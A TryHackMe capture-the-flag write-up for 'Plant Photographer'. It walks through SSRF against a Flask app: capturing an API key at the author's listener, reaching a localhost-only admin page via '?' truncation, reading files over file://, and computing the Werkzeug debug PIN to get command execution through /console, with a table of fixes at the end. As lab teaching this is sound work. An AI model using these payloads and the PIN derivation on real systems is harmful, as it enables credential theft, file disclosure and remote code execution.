---
description: "TryHackMe Plant Photographer — a Flask portfolio site whose Download Resume button lets the browser choose which server the application fetches from. Pointing it at a listener hands over the outbound X-API-KEY; a trailing ? truncates the path and reaches an admin page that trusts request.remote_addr == '127.0.0.1'; and because pycurl also speaks file://, the same parameter becomes arbitrary file read. debug=True then turns that into RCE through the Werkzeug console, whose PIN is derived entirely from files you can already read. Includes the PIN I computed from memory and got rejected, and the controls that proved the empty ffuf sweeps were true negatives."
---

# Plant Photographer — the browser gets to choose which server the server talks to

**TryHackMe · challenge: Plant Photographer · target: `http://10.x.x.x/` (the lab IP changes per lease)**

> **Every flag is redacted** here as `THM{[redacted]}`. Everything that teaches stays: every request,
> every flag explained, the exact character that truncates the URL, the wrong turns, and the controls
> that prove each result. The flag strings themselves teach nothing — they are just proof you were
> there, and printing them hands the room's answers to the next person instead of letting them earn
> them.

**The brief**, in the room's own words:

> Your friend, a passionate botanist and aspiring photographer, recently launched a personal
> portfolio website to showcase his growing collection of rare plant photos. Proud of building the
> site himself from scratch, he's asked you to take a quick look and let him know if anything could
> be improved. **Look closely at how the site works under the hood, and determine whether it was
> coded with best practices in mind.**

Three questions to answer:

1. What API key is used to retrieve files from the secure storage service?
2. What is the flag in the admin section of the website?
3. What flag is stored in a text file in the server's web directory?

Read those questions before touching the box, because they leak the shape of the room:

- Question 1 mentions a **secure storage service** and an **API key**. So the site talks to some
  other service, and it authenticates when it does.
- Question 2 says an **admin section** exists — so there is a door, and presumably a way through it.
- Question 3 says a **text file in the web directory** — a file on the server's disk.

Nothing suggests password cracking or binary exploitation. If you find yourself starting `hashcat`
here, you have wandered off.

**A note on TryHackMe's answer masks.** Each answer box shows a pattern like
`***{*****_**_****_**_***_***}`. That is a free checksum: count the characters of your candidate
answer against it *before* submitting. It has caught off-by-one errors in other rooms and it confirms
all three answers here.

---

## Phase 1 — Recon: is it up, and what is it?

The cheapest possible question to ask a web server is "are you there, and what are you?" A **HEAD
request** does exactly that: it asks for the headers of a page without downloading the page itself.

```bash
curl -sS -I http://10.x.x.x/
```

- `-s` — silent: don't draw the progress meter.
- `-S` — but still show errors. Using `-s` on its own hides error messages too, and then a request
  that *failed* looks identical to one that returned nothing. Silence is never success.
- `-I` — send `HEAD` instead of `GET`: headers only, no body.

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6899
Server: Werkzeug/0.16.0 Python/3.10.7
```

That last line is the most useful thing on the page. **Werkzeug** is the library underneath
**Flask**, a Python web framework, and this is Flask's *development* server. Nobody is supposed to
run that in production. So: a small, hand-written Python application — which matches "built it
himself from scratch" and tells you the interesting logic sits in one or two `.py` files rather than
in some large off-the-shelf product.

Next, the ports. A **port** is a numbered door on a machine; a service that wants to be reachable
listens behind one. Web servers usually use 80.

```bash
nmap -p- -sV -T4 --open -oN nmap-full.txt 10.x.x.x
```

- `-p-` — scan **all** 65,535 TCP ports, not just the 1,000 common ones nmap checks by default.
  Challenge boxes like to hide a second service on an odd high port.
- `-sV` — once a port is found open, talk to it and identify the software and version behind it.
- `--open` — only report open ports; skip the noise.
- `-T4` — timing template 4: fast, but not the reckless `-T5`. A lab VM often has a single CPU, and
  hammering it means you end up debugging your own traffic instead of the target.
- `-oN file` — write a plain-text copy of the results to a file. Keep your evidence.

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
```

Two doors. SSH is a remote login service and, with no username and no password, it is not a way in.
Everything the room asks about is on port 80.

---

## Phase 2 — Read the page before poking it

This is the step people skip, and it is usually the step that solves the room. Fetch the homepage and
actually read the HTML — every `<script>`, every comment, every link.

Two lines out of 168 matter.

**The admin area advertises itself** (inside a sidebar that only appears when you click the hamburger
menu icon, which is why you might never see it by clicking around):

```html
<a href="/admin"><span style="color:goldenrod;">Admin Area</span></a>
```

**And the "Download Resume" button:**

```html
<a href="/download?server=secure-file-storage.com:8087&id=75482342">
```

Stop and read that, because it is the entire room.

Clicking that link asks **the web server** to go and fetch a file. And the address it fetches from —
`secure-file-storage.com:8087` — is not fixed in the server's code. It arrives **from the browser**,
in a URL parameter called `server`. The user gets to choose where the server connects.

That is **SSRF — Server-Side Request Forgery**. You hand an application a destination, and the
application makes a network request to it *from its own machine, with its own identity*. Two
consequences follow immediately, and they are questions 1 and 2:

1. Point `server` at **your own machine**, and the target connects to you — carrying whatever
   credentials it normally sends to the storage service.
2. Point `server` at an **internal** address like `127.0.0.1` (a machine's name for itself), and the
   target reaches services that were never meant to be exposed. Such as an admin page that only
   trusts requests from localhost.

Two quick probes confirm the shape:

| Request | Response |
|---|---|
| `/download?server=secure-file-storage.com:8087&id=75482342` | `200`, `Content-Type: application/pdf`, 254,908 bytes beginning `%PDF-1.7` |
| `/admin` | `200`, 48 bytes: `Admin interface only available from localhost!!!` |
| `/robots.txt` | `404` |

The download is a **real proxy**: the bytes start with `%PDF`, the magic number every PDF file begins
with, so the server genuinely fetched a quarter-megabyte file and streamed it back. You control the
destination *and* you get to read the answer — the most useful kind of SSRF there is.

And `/admin` is guarded by *where the request came from*, not by *who is asking*. There is no
password. Hold that thought.

---

## Phase 3 — Make the server introduce itself (question 1)

To read what the target sends, you need something listening. A **listener** is just a program sitting
on a port waiting for a connection. Roughly 30 lines of Python is better than `nc` here, because it
writes the raw request to a log file and answers with a valid HTTP 200 so the target does not hang:

```bash
nohup python3 listener.py 80 callback.log > listener.out 2>&1 &
echo "LISTENER_PID=$!"
ss -ltnp | grep ':80 '
```

- `nohup … &` — run it in the background, detached from this shell.
- `$!` — the **PID** (process ID: the number the operating system uses to identify a running
  program) of the command just backgrounded. **Write it down.** At the end of the engagement you kill
  that number specifically. Pattern-matching kills like `pkill -f` fail silently and take innocent
  processes with them.
- `ss -ltnp` — list **l**istening **t**cp sockets, **n**umerically, with the owning **p**rocess.

```
LISTEN 0 5 0.0.0.0:80 0.0.0.0:* users:(("python3",pid=1924028,fd=3))
```

Check that the PID in that output is *the PID you just launched*, not merely that "something is
listening on 80". A leftover server from an earlier session bound to the same port will happily
absorb your callbacks and make a broken setup look like it works.

**Two things worth checking before you rely on any inbound connection**, because a connection that is
silently dropped looks exactly like one that was never made:

```bash
systemctl is-active ufw                          # active
grep DEFAULT_INPUT_POLICY /etc/default/ufw       # DROP
cat /proc/sys/net/ipv4/ip_unprivileged_port_start # 0
```

Your **own** firewall is part of the channel. Kali ships `ufw` with a default inbound policy of
`DROP`, and a callback that dies at your own front door produces exactly the same silence as an
exploit that never fired. (The default policy is only the fallback — explicit allow rules can invert
it, so check `ufw status verbose` if you can. Port 80 is the conventional TryHackMe choice and is
commonly allowed.) The third command matters too: ports below 1024 normally require root, but
`ip_unprivileged_port_start = 0` means you can bind port 80 as an ordinary user here.

Now the trigger — the same URL as the Download Resume button, with `server` swapped for your VPN
address:

```
http://10.x.x.x/download?server=<YOUR-TUN0-IP>:80&id=75482342
```

The target answered `200` with the body my listener had sent it, proxied straight back. And the log
holds what arrived:

```
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: <YOUR-TUN0-IP>
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{[redacted]}
```

**Question 1, answered.** The API key was never printed on any page and never sent to any browser.
It is added by the server, on the way out, to a destination the client chose.

**Why this is a genuine vulnerability and not a party trick.** Any secret a server attaches to an
outbound request belongs to *the destination*. The moment an attacker controls the destination, the
secret is simply handed over. This is why SSRF ranks so highly: the finding is not "the server
fetched a URL", it is "the server acted with its own credentials on my instructions".

Two more gifts in that log:

- `User-Agent: PycURL/…` — the app uses **pycurl**, Python's binding to **libcurl**. Remember this.
  libcurl is not an HTTP client; it is a *transfer* library, and it speaks many protocols.
- The exact path it requested: `/public-docs-k057230990384293/75482342.pdf`. So the application
  builds its URL as `<server>` + `/public-docs-k057230990384293/` + `<id>.pdf`.
  **You control the front of that string.**

---

## Phase 4 — The app hands over its own source code

Aim the SSRF at `127.0.0.1:80` and you get a `500` error — and the error page is a full **Werkzeug
debugger traceback**. Flask's `debug=True` renders, to anybody who can trigger an exception, the
entire call stack *with the source lines around each frame*. On a box reachable from the internet
that is a source-code disclosure, and it hands over `/usr/src/app/app.py` line 31:

```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{[redacted]}'])
```

At the bottom of that same page: *"Console Locked — The console is locked and needs to be unlocked by
entering the PIN."* That is Werkzeug's interactive debugger at `/console`: a Python prompt **inside
the running application** — remote code execution — protected only by a numeric PIN. Park it; it
becomes question 3.

A different probe produces a different, equally useful error. Try a path-traversal string in `id`:

```
ValueError: invalid literal for int() with base 10: '../../admin'
```

`id` is passed through Python's `int()`, so it can only ever be digits. **Every bit of path control
you have lives in the `server` parameter.** Knowing which parameter is a dead end is worth as much as
knowing which one is not.

### Where is the app actually listening?

`127.0.0.1:80` said **Connection refused**, which is odd — port 80 is open from outside. So use the
SSRF as a **port scanner against the target's own loopback interface**: ask it to connect to each
port in turn and read the error message.

| Port on `127.0.0.1` | Result |
|---|---|
| 80, 443, 3000, 5000, 5001, 8000, 8080, 8888, 9000 | `Connection refused` |
| **8087** | `200` — a PDF |

And `127.0.0.1:8087/?` returns the portfolio homepage. So **8087 is the web app itself**, and the
"secure file storage service" is the very same application. The Dockerfile later spells it out:

```dockerfile
RUN echo 127.0.0.1 secure-file-storage.com >> /etc/hosts
```

The whole external storage provider is one line in `/etc/hosts` pointing back at itself. Port 80
exists outside because the container publishes 8087 as 80, which is why it is refused *inside*.

> **A hostname is a claim about topology, not a fact.** I spent the first few minutes assuming
> `secure-file-storage.com` was a third party. Resolving it — even indirectly, by scanning loopback —
> changed the map of the room.

---

## Phase 5 — Reading the admin page as localhost (question 2)

`/admin` refuses anyone who is not `127.0.0.1`. The SSRF makes *the server* the client, so a request
it sends to itself arrives from `127.0.0.1` by definition.

The only obstacle is the path. The app appends `/public-docs-k057230990384293/75482342.pdf` to
whatever you supply, so end your value with a **`?`**. In a URL, everything after `?` is the *query
string* — data attached to the request, not part of the path:

```
server = 127.0.0.1:8087/admin?

→ the app fetches: http://127.0.0.1:8087/admin?/public-docs-k057230990384293/75482342.pdf
                                        ^^^^^^ the path the server sees is just /admin
                                              everything after ? is ignored query data
```

URL-encoded (`:` → `%3A`, `/` → `%2F`, `?` → `%3F`) so your own request parser doesn't eat it:

```
http://10.x.x.x/download?server=127.0.0.1%3A8087%2Fadmin%3F&id=75482342
```

Back comes 40,958 bytes starting `%PDF-1.6` — a *different* PDF from the 254,908-byte résumé. Extract
the text:

```bash
pdftotext admin-via-ssrf.pdf -
```

```
The flag is thm{[redacted]}
```

**Question 2, answered.** (Note the lowercase `thm{` on this one — submit answers exactly as they
appear.)

The source, once you read it, is three lines:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"
```

**The exam-relevant lesson:** `request.remote_addr` is *where the connection came from*, which is not
*who is asking*. Any feature that lets a server originate requests — a link-preview generator, a
webhook tester, an "import from your storage provider" button — collapses "trusted because it comes
from localhost" into no protection at all. Location is not identity. (The same reasoning defeats
`X-Forwarded-For` checks, which are worse still: the client sends that header itself.)

---

## Phase 6 — From SSRF to arbitrary file read

Remember `User-Agent: PycURL`. **libcurl speaks `file://`.** The application never restricts the
scheme — it just glues your string onto a path — so hand it a `file://` URL and it reads the local
disk.

The `?` trick does not suit a file path, so use **`#`** instead. A `#` begins a URL *fragment*, which
curl parses off and never passes to the transport:

```
server = file:///etc/passwd#

→ curl opens: file:///etc/passwd     (everything from # onwards is discarded)
```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
...
```

`/bin/ash` as root's shell means **Alpine Linux**, the tiny distribution Docker images favour. And
`/etc/hostname` returns a 12-hex-digit name — what Docker assigns a container. So everything you read
lives *inside a container*.

Then the whole application, in one request:

```
server = file:///usr/src/app/app.py#
```

```python
import os, pycurl
from io import BytesIO
from flask import Flask, send_from_directory, render_template, request, Response

app = Flask(__name__, static_url_path='/static')

@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"

@app.route("/download")
def download():
    file_id = request.args.get('id','')
    server  = request.args.get('server','')
    if file_id != '':
        filename = str(int(file_id)) + '.pdf'
        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
        crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{[redacted]}'])
        crl.perform()
        ...

@app.route('/public-docs-k057230990384293/<path:path>')
def public_docs(path):
    return send_from_directory('public-docs', path)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8087, debug=True)
```

Every guess confirmed, and the last line is the one that matters: **`debug=True`**, in production.

---

## Phase 7 — Hunting the text file (question 3)

Question 3 wants a flag in "a text file in the server's web directory". The obvious names come first,
because each costs one request: `flag.txt`, `notes.txt`, `secret.txt`, `todo.txt`, `readme.txt` — at
`/usr/src/app/` and in its `public-docs/`, `private-docs/`, `static/` and `templates/` subfolders.
All errored.

**That result is only trustworthy because the batch carried its own controls.** In the same run:
`app.py`, which I *knew* existed, returned 1,452 bytes; `zzzz-cannot-exist-9971.txt`, which cannot
exist, errored. A detector that has never been shown to say "yes" tells you nothing when it says
"no".

Next, content discovery over HTTP with `ffuf`. Prepare the wordlist first:

```bash
grep -viE '^(setup|install|reset|clear|block|seed|migrate|init|delete|drop|truncate|purge)$' \
  /usr/share/wordlists/dirb/common.txt | sed 's#^/##' > wl.txt
printf '75482342\nzzz-control-9971\n' >> wl.txt     # positive + negative control
```

That `grep -v` is not fussiness. **A content sweep is not read-only** — it issues a real GET to every
path it can name, and a wordlist containing `reset` or `delete` will cheerfully fire them, on every
re-run. Strip destructive names before sweeping anything.

The two extra lines are the controls: a filename known to exist, and one that cannot.

```bash
ffuf -u 'http://10.x.x.x/FUZZ' -w wl.txt -e .txt,.pdf -mc all -fs 232 -t 25 -s
ffuf -u 'http://10.x.x.x/public-docs-k057230990384293/FUZZ' -w wl.txt -e .txt,.pdf -mc all -fs 232 -t 25 -s
ffuf -u 'http://10.x.x.x/static/FUZZ' -w wl-static.txt -e .txt -mc all -fs 232 -t 15 -s
```

- `FUZZ` — the placeholder each wordlist entry is substituted into.
- `-e .txt,.pdf` — also try each word with these extensions appended.
- `-mc all` — match **all** status codes. This matters more than it looks: `ffuf`'s default match
  list is `200,204,301,302,307,401,403,405,500` and **does not include 404**. An application that
  answers "that exists but you asked wrong" with a 404 is invisible to a default run.
- `-fs 232` — filter out responses of exactly 232 bytes, this app's stock "Not Found" page. With
  `-mc all` letting everything through, *size* becomes the discriminator.
- `-t 25` — 25 concurrent threads. Not 80. Lab VMs fall over.
- `-s` — silent: print hits only.

Results:

| Sweep | Hits |
|---|---|
| web root | `admin`, `console`, `download` |
| `public-docs-k057230990384293/` | `75482342.pdf` ← **positive control fired** |
| `/static/` | `imgs/profile.jpeg` ← **positive control fired** |

**Read the control rows before the result rows.** In both directory sweeps the file known to exist
came back and the impossible one did not, so the sweeps could see — and their silence about `.txt`
files is real evidence rather than a broken instrument. Conclusion: the text file is not named
anything a dictionary knows, and probably is not served over HTTP at all.

The root sweep also surfaced **`/console`** — the debugger from Phase 4.

### Wrong turn: I computed the PIN from memory

Werkzeug does not store a random secret for the console. It **derives** the PIN by hashing a handful
of facts about the machine and the app, so a developer sees a stable PIN in their own terminal. In
version 0.16.0 the ingredients, hashed with MD5, are:

| Ingredient | Where it comes from |
|---|---|
| `username` | `getpass.getuser()` — here `root`, confirmed by `Uid: 0` in `/proc/self/status` |
| `modname` | `flask.app` (fixed for a Flask app) |
| app class name | `Flask` (fixed) |
| flask's own `app.py` path | `/usr/local/lib/python3.10/site-packages/flask/app.py` — the traceback showed it |
| `str(uuid.getnode())` — the MAC address as a decimal integer | `/sys/class/net/eth0/address` |
| `get_machine_id()` | `/proc/self/cgroup`, `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` |

Every one of those is a file you can already read. The salts `cookiesalt` and `pinsalt` are constants
in the library. **The PIN is not a secret once file read exists — it is a checksum of public facts.**

I read the ingredients, hashed them the way I remembered the algorithm working — boot id *plus*
container id — and got:

```json
{"auth": false, "exhausted": false}
```

**The temptation is to tweak one ingredient and try again. Don't.** Werkzeug allows about **ten**
failed attempts and then locks the console until the process restarts. Guessing burns a budget you
cannot refill, and every guess rests on the same unexamined assumption.

So I read the algorithm instead of remembering it — the file is right there, through the primitive
already in hand:

```
server = file:///usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py#
```

```python
def _generate():
    # docker containers share the same machine id, get the container id instead
    try:
        with open("/proc/self/cgroup") as f:
            value = f.readline()
    except IOError:
        pass
    else:
        value = value.strip().partition("/docker/")[2]
        if value:
            return value          # <-- returns HERE. boot_id is never reached.
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        ...
```

Inside a container the function **returns the container id and stops**. The boot id is a fallback for
the non-container case, not an addition. My extra 36 bytes poisoned the hash.

> **The rule this earns:** never derive a value from a remembered algorithm when the algorithm itself
> is a file you can read. The whole point of a file-read primitive is that it turns "what does this
> library do?" from recall into observation — and I had it working for four steps before I used it on
> the one thing I was guessing about.

### Unlocking the console

Recomputed with the container id alone:

```python
bits = [username, modname, appclass, flask_app_py_path, str(uuid_getnode), container_id]
h = md5(b"".join(bits))
h.update(b"cookiesalt")
cookie = "__wzd" + h.hexdigest()[:20]
h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]
pin = "-".join(num[i:i+3] for i in (0, 3, 6))     # e.g. 110-688-511
```

The console page carries a per-session `SECRET` in its JavaScript, which must accompany every
debugger request:

```
GET /console                                                    → scrape SECRET from the page
GET /console?__debugger__=yes&cmd=pinauth&pin=<PIN>&s=<SECRET>  → {"auth": true, "exhausted": false}
```

Then one command — a directory listing, which is the only thing this was for:

```
GET /console?__debugger__=yes&frm=0&s=<SECRET>&cmd=
    import subprocess;print(subprocess.run(['ls','-la','/usr/src/app'],capture_output=True,text=True).stdout)
```

```
-rw-r--r-- 1 root root   548 Sep 16  2022 Dockerfile
-rw-r--r-- 1 root root  1452 Oct 10  2022 app.py
-rw-r--r-- 1 root root    26 May 19  2025 flag-982374827648721338.txt
drwxr-xr-x 2 root root  4096 Sep 15  2022 private-docs
drwxr-xr-x 2 root root  4096 May 19  2025 public-docs
-rw-r--r-- 1 root root   144 Sep 15  2022 requirements.txt
drwxr-xr-x 3 root root  4096 Sep 15  2022 static
drwxr-xr-x 2 root root  4096 Sep 15  2022 templates
```

`flag-982374827648721338.txt`, with an 18-digit random suffix. **No wordlist contains that** — which
is exactly why every sweep came back empty, and why those empty results were *correct* rather than
broken. (The filename stays unredacted here because it is part of the method: the whole lesson is
that no dictionary could have produced it.)

Read it back with the ordinary file primitive rather than the console, because the smaller primitive
is the one worth demonstrating:

```
server = file:///usr/src/app/flag-982374827648721338.txt#

→ THM{[redacted]}
```

**Question 3, answered.** And the flag's own text names the intended chain: SSRF to RCE.

**One last control, worth the two requests.** Fetching `/flag-982374827648721338.txt` and
`/static/flag-982374827648721338.txt` directly both return **404** — the file genuinely is not served
over HTTP, so no amount of content discovery could ever have found it. That converts "my sweeps found
nothing" from an assumption into a verified true negative. A sweep that had missed a *served* file
would have been a broken instrument I was about to trust again.

---

## What the friend actually did wrong

Six findings, in the order they compound. Any one alone is survivable; chained, they are a full read
of the filesystem as root.

| # | Finding | Fix |
|---|---|---|
| 1 | **SSRF** — the fetch destination arrives in a query parameter | The storage host belongs in server-side configuration. If a user-supplied destination is truly required, allow-list it — and check what the allowed name *resolves to*, because an allow-listed host pointing at `127.0.0.1` is no allow-list at all |
| 2 | **No scheme restriction**, so `file://` works and SSRF becomes arbitrary file read | `crl.setopt(pycurl.PROTOCOLS, pycurl.PROTO_HTTPS)` |
| 3 | **URLs built by string concatenation**, so a trailing `?` or `#` discards the "fixed" path | Build URLs with a URL library and percent-encode each part |
| 4 | **Authorisation by source address** (`request.remote_addr == '127.0.0.1'`) | Authenticate the *user*. Location is not identity |
| 5 | **Hardcoded credential** in source (`X-API-KEY`) | Environment variable or secret store — and rotate a key that has ever been in a file |
| 6 | **`debug=True` in production** | Never ship it. Run behind a real WSGI server |

Finding 6 is the one that turns an embarrassment into a compromise. It leaked the entire source
through a traceback, and its `/console` is remote code execution guarded by a PIN derived wholly from
files an attacker with file read can already see.

---

## Method notes worth stealing

- **Read the page before you fuzz it.** Both `/admin` and the vulnerable `/download` parameter were
  in the homepage HTML. No wordlist was needed to find either.
- **Every sweep carries a positive and a negative control, in the same run.** Three sweeps here
  returned "nothing", and all three were believable only because a known file came back in each.
- **Two failed attempts at the same fix means the diagnosis is wrong.** The PIN failure was one
  attempt and five assumptions; the fix was to read the algorithm, not to permute the inputs.
- **`?` and `#` are path-truncation characters** whenever an application concatenates your input onto
  a URL. `?` turns the rest into a query string; `#` turns it into a fragment that never leaves the
  client.
- **Check your own firewall before trusting any callback**, and verify that *your* listener owns the
  port by PID — not that *some* listener exists.
- **Kill what you started, by PID, and verify.** `ps -p <pid>` showing nothing and `ss -ltn` showing
  no listener is the check. "The kill command exited 0" is not.
